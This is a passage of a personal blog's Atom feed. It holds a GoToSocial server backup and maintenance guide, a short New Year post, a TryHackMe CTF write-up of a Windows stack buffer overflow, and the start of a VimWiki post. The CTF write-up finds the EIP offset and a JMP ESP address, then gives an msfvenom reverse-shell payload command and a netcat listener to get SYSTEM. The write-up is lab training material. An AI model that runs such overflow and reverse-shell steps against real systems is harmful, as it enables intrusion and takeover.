&lt;span class="nt"&gt;After&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;network-online.target

&lt;span class="k"&gt;[Service]&lt;/span&gt;
&lt;span class="nt"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;oneshot
&lt;span class="nt"&gt;Restart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;no

&lt;span class="nt"&gt;ExecStart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;systemd-inhibit --who="scp" --what="sleep:shutdown" --why="Prevent interrupting VPS backup" scp -O &amp;lt;my-vps&amp;gt;:/home/&amp;lt;username&amp;gt;/backups/&amp;lt;hostname&amp;gt;-vps-backup.tar.gz /&amp;lt;path of your choosing&amp;gt;/&amp;lt;hostname&amp;gt;-vps-backup.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Control this service by adding the following &lt;code&gt;~/.config/systemd/user/vps-backup.timer&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight systemd"&gt;&lt;code&gt;&lt;span class="k"&gt;[Unit]&lt;/span&gt;
&lt;span class="nt"&gt;Description&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;VPS backup

&lt;span class="k"&gt;[Timer]&lt;/span&gt;
&lt;span class="nt"&gt;OnCalendar&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;*-*-* 10:00:00
&lt;span class="nt"&gt;OnBootSec&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;10m
&lt;span class="nt"&gt;Persistent&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;true

&lt;span class="k"&gt;[Install]&lt;/span&gt;
&lt;span class="nt"&gt;WantedBy&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;timers.target
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Our VPS backups are quite light, so setting this service to run at 10 AM should be plenty enough time to get your daily archive. Run &lt;code&gt;systemd-analyze verify ~/.config/systemd/user/vps-backup.*&lt;/code&gt; to check all files are valid and &lt;code&gt;systemctl --user start vps-backup.timer &amp;amp;&amp;amp; systemctl --user enable vps-backup.timer&lt;/code&gt; to enable the service. Your archive should end up being copied in the specified path.&lt;/p&gt;

&lt;h2&gt;Restoring files and directories from your backups&lt;/h2&gt;

&lt;p&gt;Some disaster happened and it&amp;#39;s now time to make your backups worth their while. If you still have access to your local archive, copy it to your VPS with &lt;code&gt;scp -O /&amp;lt;path of your choosing&amp;gt;/&amp;lt;hostname&amp;gt;-vps-backup.tar.gz my-vps:/home/&amp;lt;username&amp;gt;/backups&lt;/code&gt;, SSH into your VPS and untar it with &lt;code&gt;sudo tar xzvf /home/&amp;lt;username&amp;gt;/backups/&amp;lt;hostname&amp;gt;-vps-backup.tar.gz --directory=/home/&amp;lt;username&amp;gt;/backups&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then, use your &lt;code&gt;restic-local&lt;/code&gt; script (or copy it like shown earlier if it was also lost), and restore anything needed in a temporary location:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Grab the ID of the snapshot you wanna use:&lt;/span&gt;
&lt;span class="nb"&gt;sudo&lt;/span&gt; ~/backups/restic-local snapshots 

&lt;span class="c"&gt;# Restore a directory or file:&lt;/span&gt;
&lt;span class="nb"&gt;sudo&lt;/span&gt; ~/backups/restic-local restore &amp;lt;ID&amp;gt; &lt;span class="nt"&gt;--target&lt;/span&gt; /tmp &lt;span class="nt"&gt;--include&lt;/span&gt; /&amp;lt;path of directory or file to restore&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Navigate to &lt;code&gt;/tmp&lt;/code&gt;, browse and select any file to restore. Before copying them however, be sure to run &lt;code&gt;sudo systemctl stop gotosocial&lt;/code&gt;. Run the same command using &lt;code&gt;start&lt;/code&gt; when you&amp;#39;re done restoring.&lt;/p&gt;

&lt;p&gt;If you&amp;#39;re restoring a systemd service file, run &lt;code&gt;sudo systemctl daemon-reload&lt;/code&gt; afterwards to scan for changes.&lt;/p&gt;

&lt;p&gt;If you&amp;#39;re restoring the entire database from your &lt;code&gt;postgres.dump&lt;/code&gt;, run &lt;code&gt;sudo -u postgres psql -f postgres.dump postgres&lt;/code&gt; from the directory where the dump is present.&lt;/p&gt;

&lt;p&gt;This general restore process is the same if you only have access to your remote backups, using your &lt;code&gt;restic-hetzner&lt;/code&gt; script or any other provider you have.&lt;/p&gt;

&lt;p&gt;Delete the files and directories from their temporary locations in &lt;code&gt;/tmp&lt;/code&gt; afterwards, and you should be all set.&lt;/p&gt;

&lt;h2&gt;Additional maintenance tips and FAQs&lt;/h2&gt;

&lt;h3&gt;I changed my Caddyfile config, how do I apply changes without any downtime?&lt;/h3&gt;

&lt;p&gt;Run &lt;code&gt;sudo -u caddy caddy reload --config /etc/caddy/Caddyfile&lt;/code&gt; after editing your Caddyfile.&lt;/p&gt;

&lt;h3&gt;I need to check IPs banned by fail2ban.&lt;/h3&gt;

&lt;p&gt;Run &lt;code&gt;sudo fail2ban-client status gotosocial-4xx&lt;/code&gt; to get a list of banned IPs. You should also see them in ufw with &lt;code&gt;sudo ufw status verbose&lt;/code&gt;.&lt;/p&gt;

&lt;h3&gt;I messed up, how do I manually unban an IP in fail2ban?&lt;/h3&gt;

&lt;p&gt;Run &lt;code&gt;sudo fail2ban-client set gotosocial-4xx unbanip &amp;lt;IP address&amp;gt;&lt;/code&gt;. Check if it worked with &lt;code&gt;sudo cat /var/log/fail2ban.log&lt;/code&gt;.&lt;/p&gt;

&lt;h3&gt;I screwed up keys generation with GPG, how do I delete them before re-creating them?&lt;/h3&gt;

&lt;p&gt;Run &lt;code&gt;gpg --list-keys&lt;/code&gt; and use the long ID it outputs with the following commands:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;gpg &lt;span class="nt"&gt;--delete-secret-key&lt;/span&gt; &amp;lt;ID&amp;gt;
gpg &lt;span class="nt"&gt;--delete-key&lt;/span&gt; &amp;lt;ID&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Run &lt;code&gt;gpg --list-keys&lt;/code&gt; one more time to make sure they&amp;#39;ve been deleted.&lt;/p&gt;

&lt;h3&gt;I&amp;#39;ve had to restore everything: how do I import my saved GPG keys on a new VPS?&lt;/h3&gt;

&lt;p&gt;Transfer your keys in your new VPS (assuming &lt;code&gt;gpg&lt;/code&gt; + &lt;code&gt;gpg-agent&lt;/code&gt; are already installed there), then run the following:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;gpg &lt;span class="nt"&gt;--import&lt;/span&gt; &amp;lt;mygpgkey_pub.asc&amp;gt;
gpg &lt;span class="nt"&gt;--allow-secret-key-import&lt;/span&gt; &lt;span class="nt"&gt;--import&lt;/span&gt; &amp;lt;mygpgkey_sec.asc&amp;gt;
gpg &lt;span class="nt"&gt;--edit-key&lt;/span&gt; &amp;lt;email address&amp;gt; &lt;span class="c"&gt;# Run trust in gpg prompt and select "ultimate trust (5)".&lt;/span&gt;
gpg &lt;span class="nt"&gt;--list-secret-keys&lt;/span&gt; &lt;span class="c"&gt;# Check if trust changed accordingly.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Don&amp;#39;t forget to delete the keys you transferred, now that they&amp;#39;re in your GPG keyring.&lt;/p&gt;

&lt;h2&gt;All done?&lt;/h2&gt;

&lt;p&gt;Although this should be a good start for a GoToSocial instance, there is always room for improvement: adjusting media caching, database maintenance, tweaking WAF rules... The list is endless, and it doesn&amp;#39;t even mention moderation and domain blocks / allows, which are arguably the hardest parts about managing an instance.&lt;/p&gt;

&lt;p&gt;It can be hell at times, but you now have full control over it!&lt;/p&gt;

&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.gotosocial.org/en/latest/" rel="nofollow"&gt;https://docs.gotosocial.org/en/latest/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/imthenachoman/How-To-Secure-A-Linux-Server" rel="nofollow"&gt;https://github.com/imthenachoman/How-To-Secure-A-Linux-Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://kenhv.com/blog/securing-a-linux-server" rel="nofollow"&gt;https://kenhv.com/blog/securing-a-linux-server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/caddyserver/xcaddy" rel="nofollow"&gt;https://github.com/caddyserver/xcaddy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mholt/caddy-ratelimit" rel="nofollow"&gt;https://github.com/mholt/caddy-ratelimit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aussedatlo.me/posts/02-caddy-hardening" rel="nofollow"&gt;https://aussedatlo.me/posts/02-caddy-hardening&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://caddyserver.com/docs/running" rel="nofollow"&gt;https://caddyserver.com/docs/running&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ottorask.com/blog/caddy-and-fail2ban" rel="nofollow"&gt;https://www.ottorask.com/blog/caddy-and-fail2ban&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/community/tutorials/how-to-add-swap-space-on-debian-11" rel="nofollow"&gt;https://www.digitalocean.com/community/tutorials/how-to-add-swap-space-on-debian-11&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
  </entry>
  <entry>
    <id>tag:ovelny.sh,2024-12-31:/blog/a-quick-post-before-2025/</id>
    <title type="html">A quick post before 2025</title>
    <published>2024-12-31T00:00:00Z</published>
    <updated>2024-12-31T00:00:00Z</updated>
    <link rel="alternate" href="https://ovelny.sh/blog/a-quick-post-before-2025/" type="text/html"/>
    <content type="html">&lt;p&gt;I&amp;#39;m taking the opportunity to make one last post for 2024, a few hours before the new year begins.&lt;/p&gt;

&lt;p&gt;I want this place to be more active! While I&amp;#39;ve been updating my wikis quite a lot, I didn&amp;#39;t post anything new since a long while.&lt;/p&gt;

&lt;p&gt;This needs to change for 2025.&lt;/p&gt;

&lt;p&gt;I need to make this place truly mine.&lt;/p&gt;

&lt;p&gt;Not everything has to be an elaborate, exhaustive post that I&amp;#39;ll proofread into oblivion. Not everything needs to be a showcase of tech proficiency. Writing about anything else matters just as much.&lt;/p&gt;

&lt;p&gt;Perfectionism leads nowhere, even when you take things slow. I aim to break that cycle and embrace the fear leading up to that change. We&amp;#39;ll see where that goes (•ᴗ•)&lt;/p&gt;

&lt;p&gt;While my next post will be about tech, the others might not.&lt;/p&gt;

&lt;p&gt;Happy new year for anyone celebrating it, and thanks for reading 💜&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:ovelny.sh,2022-05-24:/blog/tryhackme-writeup-brainstorm/</id>
    <title type="html">TryHackMe writeup: Brainstorm</title>
    <published>2022-05-24T00:00:00Z</published>
    <updated>2022-05-24T00:00:00Z</updated>
    <link rel="alternate" href="https://ovelny.sh/blog/tryhackme-writeup-brainstorm/" type="text/html"/>
    <content type="html">&lt;p&gt;For a while now, I&amp;#39;ve noticed that I let a lot of writeup drafts pile up without ever publishing them. Usually when I get back to them, I forgot most of what the CTF was about and it becomes nightmarish to publish it.&lt;/p&gt;

&lt;p&gt;The solution to this is obvious: just write the entire blog post while doing the CTF! Which is something I&amp;#39;m gonna do for this TryHackMe room.&lt;/p&gt;

&lt;p&gt;Brainstorm &lt;em&gt;should be&lt;/em&gt; a simple reverse engineering room, as it&amp;#39;s meant to practice basic stack-based buffer overflows. This should be fun and I definitely need that kind of refresher, so let&amp;#39;s begin!&lt;/p&gt;

&lt;h2&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;As usual, we&amp;#39;re going to scan and enumerate the network as we have to begin somewhere.&lt;/p&gt;

&lt;h3&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Let&amp;#39;s run the following command, which will allow nmap to scan which services are running with their versions info, run standard scripts, keep scanning even if it doesn&amp;#39;t respond to ping and proceed faster for all of this:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;nmap &lt;span class="nt"&gt;-sV&lt;/span&gt; &lt;span class="nt"&gt;-sC&lt;/span&gt; &lt;span class="nt"&gt;-Pn&lt;/span&gt; &lt;span class="nt"&gt;-T4&lt;/span&gt; &amp;lt;ip-address&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This outputs the following results:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu May 12 15:12:15 2022 as: nmap -sV -sC -T4 -Pn 10.10.106.144
Nmap scan report for 10.10.106.144
Host is up (0.031s latency).
Not shown: 997 filtered tcports (no-response)
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2022-05-12T13:15:30+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2022-05-11T12:48:05
|_Not valid after:  2022-11-10T12:48:05
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2022-05-12T13:15:00+00:00
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
&amp;lt;snip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;Website or web services&lt;/h3&gt;

&lt;p&gt;N/A&lt;/p&gt;

&lt;h3&gt;Other services&lt;/h3&gt;

&lt;p&gt;N/A&lt;/p&gt;

&lt;h2&gt;Relevant findings for exploitation&lt;/h2&gt;

&lt;p&gt;Our nmap output already tells us a lot:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;We have a FTP server running with anonymous login enabled (nice!).&lt;/li&gt;
&lt;li&gt;We have a RDP port opened that will be useful to us later on.&lt;/li&gt;
&lt;li&gt;We have a custom program running with port 9999 opened, which is most likely going to be our target for reverse engineering in due time.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;First things first, let&amp;#39;s connect to the FTP server:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_1.jpg" alt="Screenshot showing a connection to the FTP server with anonymous login allowed."&gt;&lt;/p&gt;

&lt;p&gt;With anonymous login allowed, the credentials simply were anonymous:anonymous@ip-address.&lt;/p&gt;

&lt;p&gt;I had some issues at this point with passive FTP mode and EPSV that prevented me to list directories: to disable those, simply run &lt;code&gt;passive&lt;/code&gt; and &lt;code&gt;epsv&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Running &lt;code&gt;dir&lt;/code&gt;, we can see the following directory:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_2.jpg" alt="Screenshot showing a directory named &amp;quot;chatserver&amp;quot;, listed on the FTP server."&gt;&lt;/p&gt;

&lt;p&gt;By listing the content in &lt;code&gt;chatserver&lt;/code&gt;, we can find a copy of chatserver.exe and its DLL:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_3.jpg" alt="Screenshot showing the content of the &amp;quot;chatserver&amp;quot; directory. Two files are present: chatserver.exe and essfunc.dll."&gt;&lt;/p&gt;

&lt;p&gt;Great! We can now download the program (and the DLL) to work on our buffer overflow, which we will then use on the real target (chatserver on port 9999).&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ftp&amp;gt; binary
200 Type &lt;span class="nb"&gt;set &lt;/span&gt;to I.
ftp&amp;gt; get chatserver.exe
&lt;span class="nb"&gt;local&lt;/span&gt;: chatserver.exe remote: chatserver.exe
200 PORT &lt;span class="nb"&gt;command &lt;/span&gt;successful.
125 Data connection already open&lt;span class="p"&gt;;&lt;/span&gt; Transfer starting.
100% |&lt;span class="k"&gt;*********&lt;/span&gt; &amp;lt;snip&amp;gt;
226 Transfer complete.
43747 bytes received &lt;span class="k"&gt;in &lt;/span&gt;00:00 &lt;span class="o"&gt;(&lt;/span&gt;264.86 KiB/s&lt;span class="o"&gt;)&lt;/span&gt;
ftp&amp;gt; get essfunc.dll
&lt;span class="nb"&gt;local&lt;/span&gt;: essfunc.dll remote: essfunc.dll
200 PORT &lt;span class="nb"&gt;command &lt;/span&gt;successful.
125 Data connection already open&lt;span class="p"&gt;;&lt;/span&gt; Transfer starting.
100% |&lt;span class="k"&gt;*******&lt;/span&gt; &amp;lt;snip&amp;gt;
226 Transfer complete.
30761 bytes received &lt;span class="k"&gt;in &lt;/span&gt;00:00 &lt;span class="o"&gt;(&lt;/span&gt;238.18 KiB/s&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Quick aside: at this point I knew I had to use Immunity Debugger but couldn&amp;#39;t be bothered setting an entire Windows VM just for this task. Turns out that Immunity Debugger works fine with Wine on Kali! Just make sure to set the env variable &lt;code&gt;winearch&lt;/code&gt; to &lt;code&gt;win32&lt;/code&gt; when installing it and you&amp;#39;ll be all set.&lt;/p&gt;

&lt;p&gt;First things first, let&amp;#39;s see how the program behaves in a regular context. Launching the &lt;code&gt;chatserver.exe&lt;/code&gt;, we get a prompt to create a username and we&amp;#39;re then free to send messages away:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_4.jpg" alt="Screenshot showing a netcat connection being initiated on port 9999, used by chatserver.exe. A banner greets us and a prompt to enter our username and write a message appears."&gt;&lt;/p&gt;

&lt;p&gt;The program outputs the following while listening for a connection and processing our username and messages:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_5.jpg" alt="Chatserver.exe logs screenshot. It outputs a call for its needed DLL, essfunc, then it&amp;#39;s waiting for connections and once one has been established, outputs its address and port and finally the username that has been chosen."&gt;&lt;/p&gt;

&lt;p&gt;We might trigger a buffer overflow when creating our username or sending a message — or both. Let&amp;#39;s test that. The basic fuzzer that we&amp;#39;re using is the following:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_6.jpg" alt="A quick Python script that does basic fuzzing on the app. It initiates the connection that we initially did manually, and sends an increasingly bigger string of &amp;quot;AAAAA&amp;quot; until chatserver crashes."&gt;&lt;/p&gt;

&lt;p&gt;We quickly see that username creation implements a character limit so we won&amp;#39;t trigger anything with this input:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_7.jpg" alt="Chatserver logs again, that show our script has been poorly thought out as it doesn&amp;#39;t account for the username creation step, which has a proper character limit and won&amp;#39;t overflow."&gt;&lt;/p&gt;

&lt;p&gt;While editing the script to enter the username before fuzzing the app, I realized I could make it way simpler. I ended up rewriting it with the following:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_8.jpg" alt="Rewrite of the previous Python script, which includes the username creation step and is much more concise."&gt;&lt;/p&gt;

&lt;p&gt;Running the script, we notice that the app is crashing after sending 2100 bytes. We now have our starting point to work on the buffer overflow!&lt;/p&gt;

&lt;p&gt;To find the EIP offset, we generate a pattern of 2400 bytes and whip up a short exploit script, quite simple like our fuzzing script:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_9.jpg" alt="Another Python script with a payload of 2400 bytes that will help us locate the EIP offset with pattern_offset, a script present in Kali Linux."&gt;&lt;/p&gt;

&lt;p&gt;Crashing the app, we get the following EIP register value:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_10.jpg" alt="Screenshot of the EIP register value (31704330) as shown in Immunity Debugger."&gt;&lt;/p&gt;

&lt;p&gt;Which allows us to find the EIP offset:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_11.jpg" alt="Output of pattern_offset script, which deduces that the EIP offset is 2012 given the EIP register value."&gt;&lt;/p&gt;

&lt;p&gt;By editing our exploit script, we can confirm that the EIP offset is correct:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_12.jpg" alt="Immunity screenshot showing the EIP register value (42424242) after changing our Python script, to make sure that the offset is correct."&gt;&lt;/p&gt;

&lt;p&gt;Great, smooth sailing ahead of us. What we have to do next is sorting out the badchars and exploit the .dll for privilege escalation. Mona will come in useful for the latter.&lt;/p&gt;

&lt;p&gt;Finding the badchars is a simple and boring process: we just add them to our payload and find out what went wrong in our ESP dump.&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_13.jpg" alt="Updated Python script taking the offset we found into account, to inject the badchars properly and sort them out in the next step."&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_14.jpg" alt="Screenshot of our ESP dump in immunity debugger, showing that we don&amp;#39;t have any badchars except the null byte."&gt;&lt;/p&gt;

&lt;p&gt;Turns out we don&amp;#39;t have any badchars so we will be able to proceed without excluding them (except of course \x00). Let&amp;#39;s work on the .dll file next.&lt;/p&gt;

&lt;h2&gt;Privilege escalation&lt;/h2&gt;

&lt;p&gt;First, let&amp;#39;s take a look of the modules with Mona. This is simply done with the &lt;code&gt;!mona modules&lt;/code&gt; command in Immunity:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_15.jpg" alt="Output of the &amp;quot;!mona modules&amp;quot; command in Immunity Debugger, showing the .DLLs that chatserver.exe depends on along with their properties."&gt;&lt;/p&gt;

&lt;p&gt;We can see that &lt;code&gt;essfunc.dll&lt;/code&gt; is a perfect candidate for privilege escalation because it has no memory protections whatsoever. If we can find a &lt;code&gt;JMP ESP&lt;/code&gt; instruction that we can leverage for our payload, we should be good to go.&lt;br&gt;
Running &lt;code&gt;msf-nasm_shell&lt;/code&gt; on Kali, we can see that the hex instruction for &lt;code&gt;JMP ESP&lt;/code&gt; is \xff\xe4:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_16.jpg" alt="Output of msf-nasm_shell, showing the hex instruction for JMP ESP."&gt;&lt;/p&gt;

&lt;p&gt;To find this instruction in &lt;code&gt;essfunc.dll&lt;/code&gt;, Mona will again prove to be useful. Running &lt;code&gt;!mona find -s &amp;quot;\xff\xe4&amp;quot; -m essfunc.dll&lt;/code&gt; allow us to get the pointers for the instruction we&amp;#39;re looking for:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_17.jpg" alt="Output of &amp;quot;!mona find&amp;quot; command in Immunity Debugger, showing all the pointers leading to the &amp;quot;\xff\xe4&amp;quot; instruction."&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s pick the first one and check if this works. We simply adjust our script with the address and change its endianness to match our win x86 target:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_18.jpg" alt="Python script updated with our JMP ESP instruction address, reversed to match the endianness."&gt;&lt;/p&gt;

&lt;p&gt;And we put a breakpoint in Immunity for the same address. Running the exploit again, we notice that we have indeed control of the EIP:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_20.jpg" alt="Screenshot of Immunity Debugger showing the value of the EIP register, now set to our JMP ESP instruction address."&gt;&lt;/p&gt;

&lt;p&gt;We&amp;#39;re now ready to add the payload in our script and test it against the real target. To generate a payload, we use msfvenom with the following parameters to match the corresponding architecture of our target, add only the null byte to our list of badchars and make it play nicely with Python:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_21.jpg" alt="Output of &amp;quot;msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f python -b &amp;#39;\x00&amp;#39;&amp;quot; on Kali Linux. This generates our payload for a Python script while excluding the null byte."&gt;&lt;/p&gt;

&lt;p&gt;Our script now looks like this (let&amp;#39;s not forget the NOP sled too) and should hopefully be working:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_22.jpg" alt="Screenshot of our updated and final Python script, ready to inject msfvenom&amp;#39;s payload."&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s set up a netcat listener before running it with &lt;code&gt;nc -lvnp 4444&lt;/code&gt;. And sure enough, we end up getting elevated privileges on our target, just as planned!&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_23.jpg" alt="Screenshot showing that we got a connection to our target. Running the command &amp;quot;whoami&amp;quot; on Windows outputs &amp;quot;nt authority\system&amp;quot;, proving that we have elevated privileges."&gt;&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:ovelny.sh,2021-07-31:/blog/switching-from-joplin-to-vimwiki/</id>
    <title type="html">Switching from Joplin to VimWiki</title>
    <published>2021-07-31T00:00:00Z</published>
    <updated>2021-07-31T00:00:00Z</updated>
    <link rel="alternate" href="https://ovelny.sh/blog/switching-from-joplin-to-vimwiki/" type="text/html"/>
    <content type="html">&lt;p&gt;I&amp;#39;ve been using Joplin for a while now, and have been mostly happy with it. It features a simple but sufficient vim keyboard mode, notes are encrypted, and images are easily pasted in markdown.&lt;/p&gt;

&lt;p&gt;All in all this is great, but the following pain points made me reconsider this solution:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The installation and update process is painful on Linux: you need to run some shell script to get a proper install with shortcuts and icons, or you&amp;#39;re stuck with an AppImage and all the related issues accompanying it. You could also use Flatpak, but at the end of the day I&amp;#39;d just rather &lt;code&gt;sudo apt install joplin&lt;/code&gt; and move on with my life.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Uninstallation is even more painful. Have fun running &lt;code&gt;sudo find / -iname &amp;quot;*joplin*&amp;quot; 2&amp;gt;/dev/null&lt;/code&gt; and sort things out on your own, which is sadly a common occurence with Linux apps.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;No autocapitalisation. This is not a very common feature with most text editors, which I find surprising because this doesn&amp;#39;t &lt;em&gt;seem&lt;/em&gt; hard to implement?&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Joplin cloud plans. I&amp;#39;m not interested in this and just wish to keep things simple. Syncing files with &lt;a href="https://syncthing.net/" rel="nofollow"&gt;syncthing&lt;/a&gt; is free and works amazingly well.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Having to use a GUI to write text. Joplin does have a CLI interface, but learning a whole new system that mixes up custom commands with only a subset of vim commands doesn&amp;#39;t sound ideal to me.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And last but certainly not least: electron. The only apps built with it that didn&amp;#39;t end up eating a frightening amount of RAM on my systems are VSCode and Discord, no other exceptions. I&amp;#39;m not too eager to sacrifice this just to simply type text.&lt;/p&gt;

&lt;p&gt;VimWiki has been around for a while and has always intrigued me. As the name implies, this plugin allows you to maintain your own wiki via linked text files, with markdown support. But I would also need the following features to truly make it similar to Joplin:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Seamless note encryption.&lt;/li&gt;
&lt;li&gt;Syntax highlighting.&lt;/li&gt;
&lt;li&gt;Markdown preview.&lt;/li&gt;
&lt;li&gt;Easy way of pasting / linking images in markdown notes.&lt;/li&gt;
&lt;li&gt;Autocapitalisation.&lt;/li&gt;
&lt;li&gt;Easy syncing (already covered by syncthing).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Seems like some kind of deranged dream to expect all of these features from vim, but this is very doable with the following plugins:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;vim-markdown: &lt;a href="https://github.com/plasticboy/vim-markdown" rel="nofollow"&gt;https://github.com/plasticboy/vim-markdown&lt;/a&gt;&lt;/li&gt;
